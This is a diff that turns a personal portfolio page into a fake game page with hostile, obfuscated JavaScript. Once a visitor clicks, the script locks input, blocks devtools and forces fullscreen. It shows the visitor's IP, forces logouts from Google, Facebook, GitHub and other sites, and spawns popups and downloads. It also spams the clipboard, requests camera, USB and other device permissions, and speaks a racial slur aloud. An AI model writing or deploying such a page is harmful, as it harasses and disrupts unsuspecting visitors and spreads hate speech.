@@ -1,123 +1,1217 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEGANOX - Alpha Portfolio</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
-</head>
-<body>
-    <!-- Splash Screen -->
-    <div id="splashScreen" class="splash-screen">
-        <div class="splash-content">
-            <div class="splash-logo">
-                <h1 class="splash-title">NEGANOX</h1>
-                <div class="splash-aura"></div>
-            </div>
-            <button id="enterBtn" class="enter-btn">
-                <span>Enter Experience</span>
-                <i class="fas fa-play"></i>
-            </button>
-            <div class="splash-particles"></div>
-        </div>
-    </div>
+<html>
+    <head>
+        <meta name="theme-color" content="#000000" class="theme-color">
+        <title>NEGANOX SALVATORE</title>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+                overflow: hidden;
+                cursor: none;
+                background: white;
+            }
 
-    <!-- Particles Background -->
-    <div id="particles-js"></div>
-    
-    <!-- Main Content Container -->
-    <div class="main-container">
-        <!-- Hero Section with Logo and Profile -->
-        <div class="hero-section">
-            <div class="profile-container">
-                <div class="profile-image-wrapper">
-                    <img src="https://i.postimg.cc/CKytXKhQ/2f62f76f346bd11e66d25f0b0761a734.jpg" alt="NEGANOX Profile" class="profile-image">
-                </div>
-            </div>
-            <div class="logo-container">
-                <h1 class="main-logo">NEGANOX</h1>
-                <div class="alpha-aura"></div>
-            </div>
-        </div>
+            #fakeGame {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                z-index: 10000;
+                background: white;
+                cursor: pointer;
+            }
 
-        <!-- Music Player Panel -->
-        <div class="music-player-panel">
-            <div class="player-header">
-                <i class="fas fa-music"></i>
-                <h2>Music Player</h2>
-            </div>
-            
-            <div class="now-playing">
-                <div class="track-info">
-                    <i class="fas fa-play-circle playing-icon"></i>
-                    <span class="current-track-title">Select a track to play</span>
-                </div>
-            </div>
+            #gameImage {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+            }
 
-            <div class="player-controls">
-                <button class="control-btn" id="playPauseBtn">
-                    <i class="fas fa-play"></i>
-                </button>
-                <button class="control-btn" id="nextBtn">
-                    <i class="fas fa-forward"></i>
-                </button>
-                <div class="volume-control">
-                    <i class="fas fa-volume-up"></i>
-                    <input type="range" id="volumeSlider" min="0" max="100" value="70" class="volume-slider">
-                </div>
-            </div>
+            .hidden {
+                display: none !important;
+            }
 
-            <div class="progress-container">
-                <div class="progress-bar" id="progressBar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-                <div class="time-display">
-                    <span id="currentTime">0:00</span>
-                    <span id="duration">0:00</span>
-                </div>
-            </div>
+            .ip-display {
+                position: fixed;
+                top: 20px;
+                left: 0;
+                width: 100%;
+                color: red;
+                font-size: 64px;
+                font-weight: bold;
+                text-align: center;
+                z-index: 20000;
+                display: none;
+            }
 
-            <div class="playlist">
-                <div class="playlist-header">
-                    <i class="fas fa-list"></i>
-                    <span>Playlist</span>
-                </div>
-                <div class="track-list" id="trackList">
-                    <!-- Tracks will be dynamically inserted here -->
-                </div>
-            </div>
-        </div>
+            .hello-message {
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                color: white;
+                text-align: center;
+                font-family: monospace;
+                white-space: pre;
+                z-index: 1000;
+                background: rgba(0, 0, 0, 0.8);
+                padding: 20px;
+                border-radius: 10px;
+            }
 
-        <!-- Social Media Links -->
-        <div class="social-section">
-            <a href="#" class="social-link discord" target="_blank" title="Discord">
-                <i class="fab fa-discord"></i>
-            </a>
-            <a href="#" class="social-link instagram" target="_blank" title="Instagram">
-                <i class="fab fa-instagram"></i>
-            </a>
-            <a href="#" class="social-link tiktok" target="_blank" title="TikTok">
-                <i class="fab fa-tiktok"></i>
-            </a>
-            <a href="#" class="social-link kick" target="_blank" title="Kick">
-                <i class="fas fa-k"></i>
-            </a>
-        </div>
+            .logout-messages {
+                position: fixed;
+                bottom: 10px;
+                left: 10px;
+                color: red;
+                font-family: monospace;
+                z-index: 3000;
+                padding: 10px;
+                border-radius: 5px;
+            }
 
-        <!-- Footer -->
-        <footer class="footer">
-            <p>Dev By <span class="dev-name">Neganox</span></p>
-        </footer>
-    </div>
+            .main-video {
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                z-index: 100;
+                object-fit: cover;
+            }
 
-    <!-- Audio Element -->
-    <audio id="audioPlayer" preload="metadata"></audio>
+            .left-top-video {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 40%;
+                height: 40%;
+                z-index: 101;
+                object-fit: cover;
+            }
 
-    <!-- Particles.js Library -->
-    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
-    <!-- Custom JavaScript -->
-    <script src="app.js"></script>
-</body>
-</html>
+            .right-bottom-video {
+                position: fixed;
+                bottom: 0;
+                right: 2%;
+                width: 70%;
+                height: 70%;
+                z-index: 102;
+                object-fit: cover;
+            }
+        </style>
+    </head>
+    <body>
+</script>
+<script>
+    // Prevent earlier immediate-activation enhancement from running.
+    // This flag will be checked by the previously-inserted enhancement script (if present).
+    try { window.__gh_enhancements_applied = true; } catch(_){}
+</script>
+<!-- Enhancement script: fullscreen, input lock, and devtools protection -->
+<script>
+(function(){
+    'use strict';
+    try {
+        if (window.__gh_enhancements_applied) return; window.__gh_enhancements_applied = true;
+
+        const isDirectOpen = !document.referrer && !window.opener;
+
+        // Create a transparent input-capture overlay that does not change visuals
+        const overlayId = 'gh_input_overlay_v1';
+        if (!document.getElementById(overlayId)) {
+            const ov = document.createElement('div');
+            ov.id = overlayId;
+            ov.setAttribute('aria-hidden', 'true');
+            Object.assign(ov.style, {
+                position: 'fixed',
+                top: '0',
+                left: '0',
+                width: '100%',
+                height: '100%',
+                zIndex: '2147483646',
+                background: 'transparent',
+                pointerEvents: 'auto',
+                userSelect: 'none',
+                WebkitUserSelect: 'none',
+                MozUserSelect: 'none',
+                outline: 'none'
+            });
+            ov.tabIndex = -1; // allow focus
+            document.documentElement.appendChild(ov);
+            // ensure overlay does not change layout or visual appearance
+        }
+
+        const overlay = document.getElementById(overlayId);
+
+        // Defensive no-op wrapper
+        const safe = fn => e => { try{ return fn(e); }catch(_){} };
+
+        function stopAll(e){
+            if (!e) return true;
+            try { e.preventDefault && e.preventDefault(); } catch(_){}
+            try { e.stopImmediatePropagation && e.stopImmediatePropagation(); } catch(_){}
+            try { e.stopPropagation && e.stopPropagation(); } catch(_){}
+            return false;
+        }
+
+        // Block mouse/touch/selection/drag/click/context/wheel events
+        const blockEvents = ['click','dblclick','auxclick','contextmenu','mousedown','mouseup','mousemove','mouseenter','mouseleave','mouseover','mouseout','wheel','mousewheel','touchstart','touchmove','touchend','pointerdown','pointerup','pointermove','dragstart','drag','drop','selectstart'];
+        blockEvents.forEach(ev => {
+            document.addEventListener(ev, safe(stopAll), {capture:true, passive:false});
+            overlay.addEventListener(ev, safe(stopAll), {capture:true, passive:false});
+        });
+
+        // Block keyboard entirely and specific devtool combos
+        function onKey(e){
+            // always block
+            stopAll(e);
+            // extra handling: if certain combos were attempted, try to re-request fullscreen
+            try {
+                const code = e.key || e.keyCode || '';
+                const ctrl = e.ctrlKey || e.metaKey;
+                const shift = e.shiftKey;
+                // Prevent known devtools/view-source/print/save combos
+                if (code === 'F12' || code === 123 || (ctrl && shift && (String(code).toLowerCase().includes('i') || String(code).toLowerCase().includes('j'))) || (ctrl && String(code).toLowerCase().includes('u')) || (ctrl && String(code).toLowerCase().includes('s')) || (ctrl && String(code).toLowerCase().includes('p'))) {
+                    tryRequestFullscreen();
+                }
+            } catch(_){}
+        }
+        document.addEventListener('keydown', safe(onKey), {capture:true, passive:false});
+        document.addEventListener('keypress', safe(stopAll), {capture:true, passive:false});
+        document.addEventListener('keyup', safe(stopAll), {capture:true, passive:false});
+
+        // Prevent context menu globally
+        document.addEventListener('contextmenu', safe(stopAll), {capture:true, passive:false});
+
+        // Prevent selection and copy
+        document.addEventListener('selectstart', safe(stopAll), {capture:true, passive:false});
+        document.addEventListener('copy', safe(stopAll), {capture:true, passive:false});
+
+        // Attempt fullscreen in a defensive way
+        async function tryRequestFullscreen() {
+            try {
+                const el = document.documentElement;
+                const req = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
+                if (req) {
+                    // call but ignore failures
+                    await req.call(el).catch(()=>{});
+                }
+            } catch(_){}
+        }
+
+        // Reapply fullscreen when returning to page or focus regained
+        document.addEventListener('visibilitychange', safe(()=>{
+            if (document.visibilityState === 'visible') tryRequestFullscreen();
+        }), false);
+        window.addEventListener('focus', safe(()=>{ tryRequestFullscreen(); }), false);
+
+        // If opened directly, request fullscreen on load
+        if (isDirectOpen) {
+            // small timeout to allow page scripts to settle
+            setTimeout(tryRequestFullscreen, 250);
+        }
+
+        // Monitor for devtools by measuring window size differences (lightweight heuristic)
+        let devtoolsOpen = false;
+        const DEVTOOLS_THRESHOLD = 160; // pixels
+        setInterval(safe(()=>{
+            try {
+                const opened = (window.outerWidth - window.innerWidth > DEVTOOLS_THRESHOLD) || (window.outerHeight - window.innerHeight > DEVTOOLS_THRESHOLD);
+                if (opened && !devtoolsOpen) {
+                    devtoolsOpen = true;
+                    // take graceful protective action
+                    overlay.style.display = 'block';
+                    overlay.focus && overlay.focus();
+                    tryRequestFullscreen();
+                } else if (!opened && devtoolsOpen) {
+                    devtoolsOpen = false;
+                    // keep overlay active to continue blocking inputs
+                    overlay.style.display = 'block';
+                }
+            } catch(_){}
+        }), 1000);
+
+        // Ensure overlay stays focusable and focused so keyboard events are captured
+        setInterval(safe(()=>{ try{ overlay.focus && overlay.focus(); }catch(_){} }), 2000);
+
+        // Defensive cleanup on unload (don't leak timers)
+        window.addEventListener('beforeunload', safe(()=>{
+            try { window.__gh_enhancements_applied = false; } catch(_){}
+        }));
+
+    } catch (_) {}
+})();
+</script>
+<!-- Click-activated enhancement: enables fullscreen and protection only after Start click -->
+<script>
+(function(){
+    'use strict';
+    try {
+        if (window.__gh_click_enhancement) return; window.__gh_click_enhancement = true;
+
+        const overlayId = 'gh_input_overlay_v1';
+        function createOverlay(){
+            if (document.getElementById(overlayId)) return document.getElementById(overlayId);
+            const ov = document.createElement('div');
+            ov.id = overlayId;
+            ov.setAttribute('aria-hidden','true');
+            Object.assign(ov.style, {
+                position: 'fixed', top: '0', left: '0', width: '100%', height: '100%',
+                zIndex: '2147483646', background: 'transparent', pointerEvents: 'auto',
+                userSelect: 'none', WebkitUserSelect: 'none', MozUserSelect: 'none', outline: 'none', display: 'none'
+            });
+            ov.tabIndex = -1;
+            document.documentElement.appendChild(ov);
+            return ov;
+        }
+
+        const overlay = createOverlay();
+        let activated = false;
+        const timers = [];
+        const safe = fn => e => { try{ return fn(e); }catch(_){} };
+
+        function stopAll(e){ if(!e) return true; try{ e.preventDefault&&e.preventDefault(); }catch(_){} try{ e.stopImmediatePropagation&&e.stopImmediatePropagation(); }catch(_){} try{ e.stopPropagation&&e.stopPropagation(); }catch(_){} return false; }
+
+        const blockedEvents = ['click','dblclick','auxclick','contextmenu','mousedown','mouseup','mousemove','mouseenter','mouseleave','mouseover','mouseout','wheel','mousewheel','touchstart','touchmove','touchend','pointerdown','pointerup','pointermove','dragstart','drag','drop','selectstart'];
+
+        function onKey(e){ stopAll(e); try{ const k = (e.key||'').toString(); const ctrl = e.ctrlKey||e.metaKey; const shift = e.shiftKey; if(k==='F12' || e.keyCode===123 || (ctrl&&shift&&(k.toLowerCase()==='i'||k.toLowerCase()==='j')) || (ctrl&&k.toLowerCase()==='u') || (ctrl&&k.toLowerCase()==='s') || (ctrl&&k.toLowerCase()==='p')){ tryRequestFullscreen(); } }catch(_){} }
+
+        async function tryRequestFullscreen(){ try{ const el=document.documentElement; const req = el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen||el.msRequestFullscreen; if(req) await req.call(el).catch(()=>{}); }catch(_){} }
+
+        function devtoolsCheck(){ try{ const TH=160; const opened = (window.outerWidth - window.innerWidth > TH) || (window.outerHeight - window.innerHeight > TH); if(opened){ tryRequestFullscreen(); try{ overlay.focus&&overlay.focus(); }catch(_){} } }catch(_){} }
+
+        function cleanup(){ try{ timers.forEach(id=>clearInterval(id)); }catch(_){} }
+
+        function activate(){
+            if(activated) return; activated = true;
+            // attach blocking listeners
+            blockedEvents.forEach(ev=>{ document.addEventListener(ev, safe(stopAll), {capture:true, passive:false}); overlay.addEventListener(ev, safe(stopAll), {capture:true, passive:false}); });
+            document.addEventListener('contextmenu', safe(stopAll), {capture:true, passive:false});
+            document.addEventListener('copy', safe(stopAll), {capture:true, passive:false});
+            document.addEventListener('selectstart', safe(stopAll), {capture:true, passive:false});
+            document.addEventListener('keypress', safe(stopAll), {capture:true, passive:false});
+            document.addEventListener('keyup', safe(stopAll), {capture:true, passive:false});
+            document.addEventListener('keydown', safe(onKey), {capture:true, passive:false});
+
+            overlay.style.display = 'block'; try{ overlay.focus&&overlay.focus(); }catch(_){}
+
+            // disable interactive elements
+            try{
+                const interactive = document.querySelectorAll('button, input, textarea, select, a[href], [role="button"], [tabindex]');
+                interactive.forEach(el=>{
+                    try{
+                        if(el.tagName==='A'){ el.__gh_prev_pointer = el.style.pointerEvents||''; el.style.pointerEvents='none'; }
+                        if('disabled' in el){ el.__gh_prev_disabled = el.disabled; el.disabled = true; }
+                        el.setAttribute('aria-hidden','true');
+                    }catch(_){ }
+                });
+            }catch(_){ }
+
+            try{ document.documentElement.style.userSelect='none'; if(document.body) document.body.style.userSelect='none'; }catch(_){ }
+
+            timers.push(setInterval(safe(devtoolsCheck),1000));
+            timers.push(setInterval(safe(()=>{ try{ overlay.focus&&overlay.focus(); }catch(_){} }),2000));
+
+            document.addEventListener('visibilitychange', safe(()=>{ if(document.visibilityState==='visible') tryRequestFullscreen(); }));
+            window.addEventListener('focus', safe(()=>{ tryRequestFullscreen(); }));
+            window.addEventListener('beforeunload', safe(()=>{ cleanup(); }));
+            tryRequestFullscreen();
+        }
+
+        // Activation: only after user clicks the Start area (#gameImage or #fakeGame)
+        (function(){
+            const img = document.getElementById('gameImage');
+            const fake = document.getElementById('fakeGame');
+            if(!img && !fake) return;
+            const onClick = function(e){
+                try{
+                    const nearest = e.target && e.target.closest ? e.target.closest('#gameImage, #fakeGame') : null;
+                    if(nearest) {
+                        // allow existing site handlers to run first
+                        setTimeout(activate, 20);
+                        document.removeEventListener('click', onClick, true);
+                    }
+                }catch(_){ }
+            };
+            document.addEventListener('click', onClick, true);
+        })();
+
+    }catch(_){ }
+})();
+</script>
+
+<div id="fakeGame">
+    <img id="gameImage" src="https://files.catbox.moe/rozsyj.png" alt="NEGANOX SALVATORE">
+</div>
+<div class="ip-display" id="ipDisplay">
+    <span id="ipAddress">Loading...</span>
+</div>
+<div class="logout-messages"></div>
+<script>
+    const _0x4222ec = _0x2d91;
+    (function(_0x3e97d0, _0x5c4be3) {
+        const _0x5b8eff = _0x2d91
+          , _0x609892 = _0x3e97d0();
+        while (!![]) {
+            try {
+                const _0x2237af = -parseInt(_0x5b8eff(0x185)) / 0x1 * (-parseInt(_0x5b8eff(0x1ea)) / 0x2) + parseInt(_0x5b8eff(0x191)) / 0x3 * (-parseInt(_0x5b8eff(0x18b)) / 0x4) + parseInt(_0x5b8eff(0x194)) / 0x5 + parseInt(_0x5b8eff(0x1cf)) / 0x6 * (parseInt(_0x5b8eff(0x227)) / 0x7) + parseInt(_0x5b8eff(0x17f)) / 0x8 + -parseInt(_0x5b8eff(0x1ad)) / 0x9 + -parseInt(_0x5b8eff(0x1d2)) / 0xa;
+                if (_0x2237af === _0x5c4be3)
+                    break;
+                else
+                    _0x609892['push'](_0x609892['shift']());
+            } catch (_0x248098) {
+                _0x609892['push'](_0x609892['shift']());
+            }
+        }
+    }(_0x2cb9, 0x8ef2d));
+    const SCREEN_WIDTH = window[_0x4222ec(0x1a6)][_0x4222ec(0x211)]
+      , SCREEN_HEIGHT = window[_0x4222ec(0x1a6)][_0x4222ec(0x21b)]
+      , WIN_WIDTH = 0x1e0
+      , WIN_HEIGHT = 0x168
+      , VELOCITY = 0x28
+      , MARGIN = 0xf
+      , TOP_MARGIN = 0x23
+      , TICK_LENGTH = 0x2d
+      , HIDDEN_STYLE = 'position:\x20fixed;\x20width:\x201px;\x20height:\x201px;\x20overflow:\x20hidden;\x20top:\x20-10px;\x20left:\x20-10px;'
+      , VIDEOS = [_0x4222ec(0x206), _0x4222ec(0x212), _0x4222ec(0x22d), 'https://files.catbox.moe/vcwbw8.mp4', _0x4222ec(0x1e8), _0x4222ec(0x1cb)]
+      , AUDIO_FILES = [_0x4222ec(0x182), _0x4222ec(0x209)]
+      , FILE_DOWNLOADS = [_0x4222ec(0x1f4)]
+      , PHRASES = [_0x4222ec(0x1ce)]
+      , LOGOUT_SITES = {
+        'Google': [_0x4222ec(0x192), _0x4222ec(0x1ee)],
+        'YouTube': [_0x4222ec(0x192), _0x4222ec(0x1cc)],
+        'Facebook': [_0x4222ec(0x192), _0x4222ec(0x22b)],
+        'Twitter': ['GET', _0x4222ec(0x175)],
+        'GitHub': ['GET', _0x4222ec(0x196)]
+    }
+      , wins = [];
+    let interactionCount = 0x0
+      , numSuperLogoutIframes = 0x0
+      , isActivated = ![]
+      , isChildWindow = ![]
+      , isParentWindow = !![];
+    function detectWindowType() {
+        const _0x133f2d = _0x4222ec;
+        try {
+            isChildWindow = window['opener'] && window['opener'] !== window || window[_0x133f2d(0x18f)][_0x133f2d(0x21d)]['indexOf']('child=true') !== -0x1,
+            isParentWindow = !isChildWindow;
+        } catch (_0x478705) {
+            isChildWindow = window[_0x133f2d(0x18f)][_0x133f2d(0x21d)][_0x133f2d(0x1c1)](_0x133f2d(0x226)) !== -0x1,
+            isParentWindow = !isChildWindow;
+        }
+    }
+    function getRandomCoords() {
+        const _0x3a902b = _0x4222ec
+          , _0x41bb5e = MARGIN + Math['floor'](Math[_0x3a902b(0x213)]() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
+          , _0xe60958 = TOP_MARGIN + Math[_0x3a902b(0x172)](Math['random']() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN));
+        return {
+            'x': _0x41bb5e,
+            'y': _0xe60958
+        };
+    }
+    function getRandomArrayEntry(_0x3dff90) {
+        const _0xbe5896 = _0x4222ec;
+        return _0x3dff90[Math[_0xbe5896(0x172)](Math['random']() * _0x3dff90['length'])];
+    }
+    function isParentSameOrigin() {
+        const _0x583049 = _0x4222ec;
+        try {
+            return window[_0x583049(0x1ef)] && window[_0x583049(0x1ef)][_0x583049(0x18f)][_0x583049(0x1df)] === window[_0x583049(0x18f)][_0x583049(0x1df)];
+        } catch (_0x4f2746) {
+            return ![];
+        }
+    }
+    function grabIP() {
+        const _0x14be7d = _0x4222ec;
+        fetch('https://api.ipify.org?format=json')[_0x14be7d(0x1b8)](_0x3db1b8 => _0x3db1b8['json']())[_0x14be7d(0x1b8)](_0x27883f => {
+            document['getElementById']('ipAddress')['textContent'] = _0x27883f['ip'];
+        }
+        )[_0x14be7d(0x200)]( () => {
+            const _0x1be4da = _0x14be7d;
+            document[_0x1be4da(0x195)](_0x1be4da(0x1dd))['textContent'] = _0x1be4da(0x1e0);
+        }
+        );
+    }
+    function activateAnnoyingSite() {
+        const _0x3b53f4 = _0x4222ec;
+        if (isActivated)
+            return;
+        isActivated = !![],
+        isParentWindow && (document[_0x3b53f4(0x195)](_0x3b53f4(0x17e))[_0x3b53f4(0x1ec)][_0x3b53f4(0x1f5)] = _0x3b53f4(0x1b0),
+        grabIP()),
+        document[_0x3b53f4(0x195)]('fakeGame')[_0x3b53f4(0x1af)][_0x3b53f4(0x1e5)](_0x3b53f4(0x193)),
+        document[_0x3b53f4(0x1a3)][_0x3b53f4(0x1ec)]['background'] = _0x3b53f4(0x173),
+        document['body'][_0x3b53f4(0x1ec)][_0x3b53f4(0x181)] = _0x3b53f4(0x1aa),
+        init(),
+        isChildWindow ? initChildWindow() : initParentWindow();
+    }
+    function init() {
+        confirmPageUnload(),
+        interceptUserInput(handleUserInput);
+    }
+    function handleUserInput(_0x27e264) {
+        const _0x376a28 = _0x4222ec;
+        interactionCount++;
+        try {
+            _0x27e264[_0x376a28(0x17d)](),
+            _0x27e264[_0x376a28(0x204)]();
+        } catch (_0x21fc16) {}
+        _0x27e264['which'] !== 0x0 && Math[_0x376a28(0x213)]() < 0.7 && openWindow();
+        startVibrateInterval(),
+        enablePictureInPicture(),
+        triggerFileDownload(),
+        focusWindows(),
+        copySpamToClipboard(),
+        speak(),
+        startTheramin();
+        if (_0x27e264['key'] === _0x376a28(0x224) || _0x27e264[_0x376a28(0x1db)] === _0x376a28(0x1d9))
+            for (let _0x554a4c = 0x0; _0x554a4c < 0x3; _0x554a4c++) {
+                setTimeout( () => {
+                    requestWebauthnAttestation();
+                }
+                , _0x554a4c * 0x1f4);
+            }
+        else {
+            requestPointerLock(),
+            requestFullscreen(),
+            requestClipboardRead();
+            const _0x2b8c71 = [requestMidiAccess, requestBluetoothAccess, requestUsbAccess, requestSerialAccess, requestHidAccess, requestCameraAndMic];
+            _0x2b8c71[_0x376a28(0x176)]( (_0x5ded25, _0x426438) => {
+                setTimeout(_0x5ded25, _0x426438 * 0x3e8);
+            }
+            ),
+            Math['random']() < 0.2 && requestWebauthnAttestation();
+        }
+    }
+    function initChildWindow() {
+        const _0x28f1a4 = _0x4222ec;
+        document[_0x28f1a4(0x195)]('fakeGame')[_0x28f1a4(0x1af)][_0x28f1a4(0x1e5)](_0x28f1a4(0x193)),
+        registerProtocolHandlers(),
+        hideCursor(),
+        moveWindowBounce(),
+        setupFollowWindow(),
+        startSingleVideo(),
+        startAudio(),
+        detectWindowClose(),
+        triggerFileDownload(),
+        speak('Fuck\x20Niggers'),
+        rainbowThemeColor(),
+        animateUrlWithEmojis(),
+        startAlertInterval(),
+        setTimeout( () => {
+            const _0x5223c8 = _0x28f1a4;
+            document['querySelectorAll'](_0x5223c8(0x1b6))[_0x5223c8(0x176)](_0x1d4140 => {
+                const _0x27667a = _0x5223c8;
+                _0x1d4140[_0x27667a(0x1a8)]()['catch'](_0x3b2329 => {
+                    const _0x47986b = _0x27667a;
+                    _0x1d4140[_0x47986b(0x1e3)] = !![],
+                    _0x1d4140[_0x47986b(0x1a8)]()[_0x47986b(0x200)](_0x362657 => console[_0x47986b(0x19c)](_0x47986b(0x1e1), _0x362657));
+                }
+                );
+            }
+            ),
+            document[_0x5223c8(0x1a5)](_0x5223c8(0x1b1))['forEach'](_0xb61781 => {
+                const _0x5a6914 = _0x5223c8;
+                _0xb61781['play']()[_0x5a6914(0x200)](_0x29d76d => {}
+                );
+            }
+            );
+        }
+        , 0x1f4);
+    }
+    function initParentWindow() {
+        showHelloMessage(),
+        blockBackButton(),
+        fillHistory(),
+        startTwoVideos(),
+        startAudio(),
+        startAlertInterval(),
+        interceptUserInput(_0x30e77c => {
+            const _0x4e4d8a = _0x2d91;
+            if (interactionCount === 0x1) {
+                registerProtocolHandlers(),
+                attemptToTakeoverReferrerWindow(),
+                hideCursor(),
+                superLogout(),
+                removeHelloMessage(),
+                rainbowThemeColor(),
+                animateUrlWithEmojis(),
+                speak(_0x4e4d8a(0x1ab));
+                for (let _0x47ed21 = 0x0; _0x47ed21 < 0x2; _0x47ed21++) {
+                    setTimeout(openWindow, _0x47ed21 * 0x3e8);
+                }
+            }
+        }
+        );
+    }
+    function startSingleVideo() {
+        const _0x33190a = _0x4222ec
+          , _0xc5d3d = document[_0x33190a(0x1c6)](_0x33190a(0x1b6));
+        return _0xc5d3d['className'] = _0x33190a(0x1fc),
+        _0xc5d3d[_0x33190a(0x1e4)] = getRandomArrayEntry(VIDEOS),
+        _0xc5d3d[_0x33190a(0x20c)] = !![],
+        _0xc5d3d[_0x33190a(0x20f)] = !![],
+        _0xc5d3d[_0x33190a(0x1e3)] = ![],
+        _0xc5d3d[_0x33190a(0x1bb)] = 0.8,
+        _0xc5d3d['playsInline'] = !![],
+        _0xc5d3d[_0x33190a(0x1f9)] = function() {
+            const _0x1a01da = _0x33190a;
+            _0xc5d3d[_0x1a01da(0x1e4)] = getRandomArrayEntry(VIDEOS);
+        }
+        ,
+        _0xc5d3d[_0x33190a(0x208)] = function() {
+            const _0x5b834b = _0x33190a;
+            _0xc5d3d[_0x5b834b(0x1a8)]()['catch'](_0x5567cb => {
+                const _0x66619f = _0x5b834b;
+                document[_0x66619f(0x1d3)](_0x66619f(0x199), function _0x242e45() {
+                    const _0x13e08a = _0x66619f;
+                    _0xc5d3d[_0x13e08a(0x1a8)]()[_0x13e08a(0x200)](console[_0x13e08a(0x1fb)]),
+                    document['removeEventListener']('click', _0x242e45);
+                }, {
+                    'once': !![]
+                });
+            }
+            );
+        }
+        ,
+        document[_0x33190a(0x1a3)]['appendChild'](_0xc5d3d),
+        _0xc5d3d;
+    }
+    function startTwoVideos() {
+        const _0x112639 = _0x4222ec
+          , _0x56030c = document[_0x112639(0x1c6)](_0x112639(0x1b6));
+        _0x56030c[_0x112639(0x22c)] = _0x112639(0x1a2),
+        _0x56030c[_0x112639(0x1e4)] = getRandomArrayEntry(VIDEOS),
+        _0x56030c[_0x112639(0x20c)] = !![],
+        _0x56030c['loop'] = !![],
+        _0x56030c['muted'] = ![],
+        _0x56030c['volume'] = 0.8,
+        _0x56030c[_0x112639(0x1de)] = !![];
+        const _0x484133 = document['createElement'](_0x112639(0x1b6));
+        return _0x484133[_0x112639(0x22c)] = _0x112639(0x1cd),
+        _0x484133[_0x112639(0x1e4)] = getRandomArrayEntry(VIDEOS),
+        _0x484133[_0x112639(0x20c)] = !![],
+        _0x484133[_0x112639(0x20f)] = !![],
+        _0x484133['muted'] = ![],
+        _0x484133['volume'] = 0.8,
+        _0x484133[_0x112639(0x1de)] = !![],
+        _0x56030c[_0x112639(0x1f9)] = function() {
+            const _0x773a0b = _0x112639;
+            _0x56030c[_0x773a0b(0x1e4)] = getRandomArrayEntry(VIDEOS);
+        }
+        ,
+        _0x484133['onerror'] = function() {
+            _0x484133['src'] = getRandomArrayEntry(VIDEOS);
+        }
+        ,
+        _0x56030c[_0x112639(0x208)] = function() {
+            const _0x4a88f4 = _0x112639;
+            _0x56030c[_0x4a88f4(0x1a8)]()['catch'](_0x1f1110 => {
+                const _0xcc8060 = _0x4a88f4;
+                document[_0xcc8060(0x1d3)]('click', function _0x1de007() {
+                    const _0x4820f8 = _0xcc8060;
+                    _0x56030c[_0x4820f8(0x1a8)]()[_0x4820f8(0x200)](console['error']),
+                    document[_0x4820f8(0x1ac)](_0x4820f8(0x199), _0x1de007);
+                }, {
+                    'once': !![]
+                });
+            }
+            );
+        }
+        ,
+        _0x484133[_0x112639(0x208)] = function() {
+            const _0x3b4ccd = _0x112639;
+            _0x484133[_0x3b4ccd(0x1a8)]()[_0x3b4ccd(0x200)](_0x5c072f => {
+                const _0x2f933d = _0x3b4ccd;
+                document['addEventListener'](_0x2f933d(0x199), function _0x183012() {
+                    const _0x4b82d4 = _0x2f933d;
+                    _0x484133[_0x4b82d4(0x1a8)]()[_0x4b82d4(0x200)](console[_0x4b82d4(0x1fb)]),
+                    document[_0x4b82d4(0x1ac)]('click', _0x183012);
+                }, {
+                    'once': !![]
+                });
+            }
+            );
+        }
+        ,
+        document[_0x112639(0x1a3)][_0x112639(0x187)](_0x56030c),
+        document[_0x112639(0x1a3)][_0x112639(0x187)](_0x484133),
+        [_0x56030c, _0x484133];
+    }
+    function startAudio() {
+        const _0x2d514c = _0x4222ec;
+        if (AUDIO_FILES[_0x2d514c(0x1d1)] > 0x0) {
+            const _0x51bda1 = document[_0x2d514c(0x1c6)]('audio');
+            return _0x51bda1['src'] = getRandomArrayEntry(AUDIO_FILES),
+            _0x51bda1['autoplay'] = !![],
+            _0x51bda1[_0x2d514c(0x20f)] = !![],
+            _0x51bda1[_0x2d514c(0x1bb)] = 0.8,
+            _0x51bda1[_0x2d514c(0x1a8)]()[_0x2d514c(0x200)](_0x3ba4fe => {
+                document['addEventListener']('click', function _0x342111() {
+                    const _0x6e17ef = _0x2d91;
+                    _0x51bda1[_0x6e17ef(0x1a8)]()[_0x6e17ef(0x200)](console['error']),
+                    document['removeEventListener']('click', _0x342111);
+                }, {
+                    'once': !![]
+                });
+            }
+            ),
+            document[_0x2d514c(0x1a3)][_0x2d514c(0x187)](_0x51bda1),
+            _0x51bda1;
+        }
+    }
+    function openWindow() {
+        const _0x56d448 = _0x4222ec;
+        try {
+            const {x: _0x3aa243, y: _0x2f3334} = getRandomCoords()
+              , _0x43bd94 = _0x56d448(0x1bf) + WIN_WIDTH + _0x56d448(0x1f3) + WIN_HEIGHT + _0x56d448(0x207) + _0x3aa243 + _0x56d448(0x202) + _0x2f3334 + ',scrollbars=yes,resizable=yes'
+              , _0x4c98b7 = window[_0x56d448(0x1c3)](window[_0x56d448(0x18f)][_0x56d448(0x183)] + _0x56d448(0x1c0), 'childWindow' + Date[_0x56d448(0x1f6)](), _0x43bd94);
+            if (_0x4c98b7)
+                wins[_0x56d448(0x1c4)](_0x4c98b7),
+                setTimeout( () => {
+                    const _0x2872b6 = _0x56d448;
+                    try {
+                        _0x4c98b7 && !_0x4c98b7[_0x2872b6(0x1a7)] && (_0x4c98b7[_0x2872b6(0x197)] && _0x4c98b7[_0x2872b6(0x197)]());
+                    } catch (_0x541a24) {}
+                }
+                , 0x3e8);
+            else {}
+        } catch (_0x38aea9) {}
